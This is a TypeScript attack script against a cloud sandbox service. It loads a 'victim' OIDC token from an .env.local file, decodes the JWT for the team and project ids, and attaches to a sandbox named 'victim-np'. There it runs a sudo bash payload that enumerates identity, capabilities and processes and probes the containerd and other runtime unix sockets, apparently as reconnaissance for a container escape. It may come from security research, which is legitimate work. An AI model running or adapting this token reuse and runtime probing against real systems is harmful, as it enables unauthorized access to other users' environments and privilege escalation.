import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
echo "===== identity/caps ====="
id
capsh --print 2>/dev/null | head -10 || cat /proc/self/status | grep -E "Cap|Uid|Gid"
echo "===== ps full ====="
ps auxww | head -20
echo "===== unix socket processes ====="
for pid in 551 561 562 567 582 883; do
  echo "--- pid $pid ---"
  cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '; echo
done
echo "===== containerd socket probe ====="
curl -s -m 3 -i --unix-socket /run/containerd/containerd.sock http://localhost/v1/containers 2>&1 | head -20
echo "===== cell.sock probe ====="
curl -s -m 3 -i --unix-socket /run/cell/cell.sock http://localhost/ 2>&1 | head -20
echo "===== apm.sock probe ====="
curl -s -m 3 -i --unix-socket /run/apm/apm.sock http://localhost/ 2>&1 | head -20
echo "===== containerd version ====="
curl -s -m 3 --unix-socket /run/containerd/containerd.sock "http://localhost/v1/version" 2>&1 | head -c 500; echo
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });